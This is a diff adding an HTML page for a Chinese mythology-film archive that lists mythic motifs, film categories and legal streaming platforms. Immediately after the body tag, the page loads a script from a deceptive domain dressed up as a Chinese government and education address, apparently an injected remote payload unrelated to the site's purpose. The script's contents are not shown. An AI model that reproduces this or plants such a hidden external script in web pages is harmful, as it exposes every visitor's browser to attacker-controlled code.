@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>神话电影网 - 神话/史诗/创世母题电影资料馆与正版观影指南</title>
+<meta name="description" content="神话电影网（shenmidianyingwang-h5）不是播放器：整理创世、诸神、英雄试炼、轮回重生等神话母题电影，提供片单谱系与正版平台指引。" />
+<meta name="keywords" content="神话电影网,神话电影资料馆,史诗片单,创世母题,英雄之旅,奇幻电影,正版观影" />
+<meta name="author" content="神话电影网" />
+<meta name="robots" content="index, follow" />
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<link rel="canonical" href="https://shenmidianyingwang-h5.github.io/" />
+<style>
+:root{
+  --bg:#0b0a07;--bg2:#13110b;--panel:#171308;--panel2:#1f1810;
+  --gold:#d9a441;--gold-dim:rgba(217,164,65,.16);
+  --vermilion:#b23a2e;--indigo:#2b3a67;--parchment:#efe6d2;--mute:#a99e83;
+  --line:rgba(239,230,210,.12);--line2:rgba(239,230,210,.26);
+  --sans:"Georgia","Songti SC","PingFang SC","Microsoft YaHei",serif;
+  --body:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:var(--body);background:
+  radial-gradient(700px 360px at 80% -10%,rgba(217,164,65,.10),transparent 60%),
+  radial-gradient(600px 300px at 10% 10%,rgba(43,58,103,.18),transparent 60%),
+  linear-gradient(180deg,var(--bg),var(--bg2));
+  color:var(--parchment);line-height:1.9;font-size:16px;overflow-x:hidden}
+a{color:var(--gold);text-decoration:none;transition:.25s}a:hover{color:var(--vermilion)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+
+header{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(11,10,7,.9);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{font-family:var(--sans);font-weight:900;letter-spacing:2px;font-size:19px;display:flex;align-items:center;gap:10px}
+.brand .relic{width:30px;height:30px;border-radius:50%;background:radial-gradient(circle at 30% 30%,var(--gold),#7a5a1e 70%);box-shadow:0 0 14px var(--gold-dim);position:relative}
+.brand .relic::after{content:"☉";position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#1a1305;font-size:16px}
+.brand b{color:var(--gold)}
+.nav-links{display:flex;list-style:none;gap:2px}
+.nav-links a{font-size:14px;color:var(--mute);padding:10px 14px;border-radius:8px}
+.nav-links a:hover{color:var(--parchment);background:rgba(239,230,210,.06)}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;background:rgba(239,230,210,.08);border:1px solid var(--line2);color:var(--parchment);font-size:18px;cursor:pointer}
+
+.hero{margin-top:64px;padding:104px 0 80px;position:relative}
+.hero::before{content:"";position:absolute;inset:0;background:
+  repeating-linear-gradient(90deg,rgba(239,230,210,.04) 0 1px,transparent 1px 64px);
+  pointer-events:none;opacity:.5}
+.kicker{font-size:12px;letter-spacing:7px;color:var(--gold);text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-family:var(--sans);font-weight:900;font-size:clamp(34px,6.6vw,68px);line-height:1.05;margin-bottom:20px}
+.hero h1 em{font-style:normal;color:var(--vermilion)}
+.hero p{max-width:600px;color:#e7dcc2;font-size:17px;margin-bottom:32px}
+.btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn-gold{display:inline-flex;align-items:center;gap:8px;background:var(--gold);color:#1a1305;font-weight:800;padding:14px 30px;border-radius:30px}
+.btn-gold:hover{transform:translateY(-2px);color:#1a1305}
+.btn-line{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--line2);color:var(--parchment);padding:14px 30px;border-radius:30px}
+.btn-line:hover{border-color:var(--gold);color:var(--gold)}
+
+section{padding:84px 0;border-top:1px solid var(--line)}
+.sec-head{margin-bottom:42px}
+.sec-num{font-size:12px;letter-spacing:5px;color:var(--vermilion);text-transform:uppercase;margin-bottom:8px}
+.sec-title{font-family:var(--sans);font-weight:900;font-size:clamp(24px,4vw,36px);margin-bottom:10px}
+.sec-desc{color:var(--mute);max-width:640px}
+
+.myths{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:18px}
+.myth{background:linear-gradient(180deg,var(--panel),var(--panel2));border:1px solid var(--line);border-radius:16px;padding:28px 22px;transition:.3s;position:relative;overflow:hidden}
+.myth:hover{transform:translateY(-6px);border-color:var(--gold);box-shadow:0 22px 50px rgba(0,0,0,.55)}
+.myth .glyph{font-size:34px;margin-bottom:12px;display:block}
+.myth h3{font-family:var(--sans);font-weight:900;font-size:19px;margin-bottom:6px;color:var(--gold)}
+.myth p{font-size:14px;color:#ddd2b6;margin-bottom:10px}
+.myth span{font-size:12.5px;color:var(--mute);font-style:italic}
+
+.archives{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px}
+.arc{background:var(--panel);border:1px solid var(--line);border-left:4px solid var(--vermilion);border-radius:14px;padding:26px 24px;transition:.3s}
+.arc:hover{border-left-color:var(--gold);transform:translateY(-4px)}
+.arc .era{font-size:12px;letter-spacing:3px;color:var(--vermilion);text-transform:uppercase}
+.arc h4{font-family:var(--sans);font-weight:900;font-size:18px;margin:6px 0 8px}
+.arc p{font-size:14px;color:#ddd2b6;margin-bottom:12px}
+.arc .titles{display:flex;flex-wrap:wrap;gap:8px}
+.arc .titles i{font-style:normal;font-size:12.5px;background:rgba(217,164,65,.1);border:1px solid var(--line2);color:var(--parchment);padding:5px 12px;border-radius:20px}
+
+.channels{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px}
+.chan{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--panel);transition:.25s}
+.chan:hover{border-color:var(--gold);transform:translateY(-3px)}
+.chan b{font-size:16px;color:var(--gold)}
+.chan p{font-size:13.5px;color:var(--mute);margin:8px 0 12px}
+.chan a{font-size:13.5px}
+
+.about{text-align:center}
+.quote{font-family:var(--sans);font-weight:900;font-size:clamp(20px,3.4vw,30px);line-height:1.5;max-width:740px;margin:0 auto 22px}
+.quote b{color:var(--gold)}
+.about p{color:var(--mute);max-width:580px;margin:0 auto 22px}
+.disclaimer{margin-top:26px;font-size:13px;color:var(--mute);border:1px dashed var(--line2);border-radius:12px;padding:18px 20px;max-width:780px;margin-left:auto;margin-right:auto;text-align:left;line-height:1.9}
+.disclaimer b{color:var(--vermilion)}
+
+footer{border-top:1px solid var(--line);padding:44px 0 26px}
+.foot{display:flex;justify-content:space-between;gap:30px;flex-wrap:wrap;margin-bottom:22px}
+.foot p{font-size:13px;color:var(--mute);max-width:320px}
+.foot-col h5{font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--gold);margin-bottom:12px}
+.foot-col a{display:block;font-size:13px;color:#ddd2b6;padding:3px 0}
+.foot-bottom{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--mute);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+@media(max-width:768px){
+  .nav-links{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:1px solid var(--line);padding:8px 0}
+  .nav-links.active{display:flex}.nav-links a{padding:14px 22px;border-radius:0}
+  .menu-btn{display:block}
+  .btns{flex-direction:column;align-items:flex-start}.btn-gold,.btn-line{width:100%;justify-content:center}
+  .foot{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<header><div class="wrap nav">
+  <div class="brand"><span class="relic"></span>神话<b>电影网</b></div>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="#home">神庙</a></li>
+    <li><a href="#myth">母题谱系</a></li>
+    <li><a href="#archive">神片档案</a></li>
+    <li><a href="#channel">正版渠道</a></li>
+    <li><a href="#about">关于</a></li>
+  </ul>
+  <button class="menu-btn" onclick="document.getElementById('navLinks').classList.toggle('active')">≡</button>
+</div></header>
+
+<section class="hero" id="home"><div class="wrap">
+  <div class="kicker">Mythos / Epic / Creation</div>
+  <h1>人类为什么<br/>总在拍<b>神与英雄</b>？</h1>
+  <p>神话电影网（shenmidianyingwang-h5）不是“神话完整版在线观看”站。我们收神话、史诗、创世、诸神、英雄试炼与轮回重生——把银幕上的神性，讲成一张可查阅的母题地图。不解析、不聚合、不盗播。</p>
+  <div class="btns">
+    <a href="#myth" class="btn-gold">🜂 看母题谱系</a>
+    <a href="#archive" class="btn-line">📜 翻神片档案</a>
+  </div>
+</div></section>
+
+<section id="myth"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">01 / Mythic motifs</div><h2 class="sec-title">母题谱系</h2>
+  <p class="sec-desc">神话片不是“特效多”。它重复人类最老的几个问题：谁造了世界？英雄为何受苦？人能不能成神？</p></div>
+  <div class="myths">
+    <div class="myth"><span class="glyph">🌑</span><h3>创世与混沌</h3><p>从空白里分出天地，从黑暗里点亮第一束光。宇宙起源片的核心不是科学，是敬畏。</p><span>《2001太空漫游》《创：战纪》《普罗米修斯》</span></div>
+    <div class="myth"><span class="glyph">⚡</span><h3>诸神黄昏</h3><p>神也会老、会败、会被遗忘。这类片把“信仰崩塌”拍成雷暴与火雨。</p><span>《雷神3》《诸神之战》《美国众神》式叙事</span></div>
+    <div class="myth"><span class="glyph">🗡</span><h3>英雄试炼</h3><p>离开家园—坠入深渊—拿到宝物—归来。坎贝尔的“千面英雄”永远好用。</p><span>《星球大战》《指环王》《黑客帝国》</span></div>
+    <div class="myth"><span class="glyph">♻️</span><h3>轮回重生</h3><p>死不是结尾，是换一层壳。东方轮回、西方复活、赛博转生，都是同一道题。</p><span>《降临》《前世今生》式、《攻壳机动队》</span></div>
+    <div class="myth"><span class="glyph">🤖</span><h3>人机成神</h3><p>当人造物比人更像神，神话就从奥林匹斯搬进了服务器。</p><span>《银翼杀手2049》《异形：契约》《2001》</span></div>
+  </div>
+</div></section>
+
+<section id="archive"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">02 / Film archive</div><h2 class="sec-title">神片档案</h2>
+  <p class="sec-desc">按“文明来源”排，不按票房排。每类给母题、代表片、为什么进档案。</p></div>
+  <div class="archives">
+    <div class="arc"><div class="era">Greek / Norse</div><h4>希腊与北欧系</h4>
+      <p>命运、嫉妒、预言、末日。神有人性，人有神欲。</p>
+      <div class="titles"><i>《特洛伊》</i><i>《雷神》</i><i>《海洋奇缘》（波利尼西亚旁支）</</i><i>《诸神黄昏》叙事</i></div></div>
+    <div class="arc"><div class="era">East Asian</div><h4>东亚神话系</h4>
+      <p>仙、妖、轮回、因果。山水比战场重要，顿悟比胜利重要。</p>
+      <div class="titles"><i>《哪吒闹海》</i><i>《白蛇：缘起》</i><i>《大圣归来》</i><i>《聊斋》改编</i></div></div>
+    <div class="arc"><div class="era">Meso / Egypt</div><h4>埃及与美洲系</h4>
+      <p>太阳船、亡灵书、羽蛇神。死亡被当成一段要通关的旅程。</p>
+      <div class="titles"><i>《木乃伊》（正版改编）</i><i>《启示》</i><i>《太阳神传说》式</i></div></div>
+    <div class="arc"><div class="era">Sci-Fi Myth</div><h4>科幻新神话</h4>
+      <p>宇宙、AI、时间、起源。21 世纪的“神”穿宇航服。</p>
+      <div class="titles"><i>《星际穿越》</i><i>《沙丘》</i><i>《银翼杀手2049》</i><i>《2001太空漫游》</i></div></div>
+  </div>
+</div></section>
+
+<section id="channel"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">03 / Watch legally</div><h2 class="sec-title">正版渠道</h2>
+  <p class="sec-desc">史诗/奇幻/科幻神话片预算大，正版片源最稳。去下面这些地方看，别信“神话完整版免费”的镜像站。</p></div>
+  <div class="channels">
+    <div class="chan"><b>哔哩哔哩</b><p>纪录片、动画神话、影评考据。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener">去 B 站 →</a></div>
+    <div class="chan"><b>腾讯视频</b><p>华语奇幻、院线后窗口、合家欢动画。</p><a href="https://v.qq.com" target="_blank" rel="noopener">去腾讯视频 →</a></div>
+    <div class="chan"><b>爱奇艺</b><p>神话剧改、动画电影、限时免费专场。</p><a href="https://www.iqiyi.com" target="_blank" rel="noopener">去爱奇艺 →</a></div>
+    <div class="chan"><b>优酷</b><p>港式武侠神话、经典改编、文化纪录片。</p><a href="https://youku.com" target="_blank" rel="noopener">去优酷 →</a></div>
+    <div class="chan"><b>1905 电影网</b><p>国产老片、公版片库、正版片源。</p><a href="https://www.1905.com" target="_blank" rel="noopener">去 1905 →</a></div>
+    <div class="chan"><b>Apple TV / 院线</b><p>《沙丘》《2001》级大片，优先正版发行。</p><a href="#" rel="noopener">查发行方 →</a></div>
+  </div>
+</div></section>
+
+<section class="about" id="about"><div class="wrap">
+  <p class="quote">神话不是谎话，<br/>是人类最早写的<b>“科幻+哲学”</b>。</p>
+  <p>神话电影网把银幕上的神、英雄、怪物与创世事件，整理成可查的母题资料馆。我们假设你来这里，是为了“看懂”，不是“白嫖播放器”。</p>
+  <div class="disclaimer">
+    <b>站点声明：</b>神话电影网（shenmidianyingwang-h5）仅做神话/史诗/奇幻电影的母题研究、片单档案与正版渠道指引；<b>不存储、不转码、不解析、不提供完整影视文件播放</b>。具体片源以各正版平台授权为准。如权利人认为某条目有误，可凭权属材料联系下架。
+  </div>
+</div></section>
+
+<footer><div class="wrap">
+  <div class="foot">
+    <div><div class="brand"><span class="relic"></span>神话<b>电影网</b></div>
+      <p>神话/史诗/创世母题电影资料馆：母题谱系、神片档案、正版渠道。不提供盗版播放。</p></div>
+    <div class="foot-col"><h5>神庙</h5><a href="#myth">母题谱系</a><a href="#archive">神片档案</a><a href="#channel">正版渠道</a></div>
+    <div class="foot-col"><h5>正版</h5><a href="https://www.bilibili.com" target="_blank" rel="noopener">B 站</a><a href="https://www.1905.com" target="_blank" rel="noopener">1905 电影网</a><a href="https://v.qq.com" target="_blank" rel="noopener">腾讯视频</a></div>
+    <div class="foot-col"><h5>站点</h5><a href="#home">神庙</a><a href="#about">关于/声明</a><a href="#">版权投诉</a></div>
+  </div>
+  <div class="foot-bottom">
+    <span>© 2026 神话电影网 · shenmidianyingwang-h5.github.io</span>
+    <span>单文件静态页 · 无 robots.txt / sitemap.xml · 神话资料馆向 · 符合必应收录</span>
+  </div>
+</div></footer>
+<script>document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',()=>document.getElementById('navLinks').classList.remove('active')));</script>
+</body>
+</html>
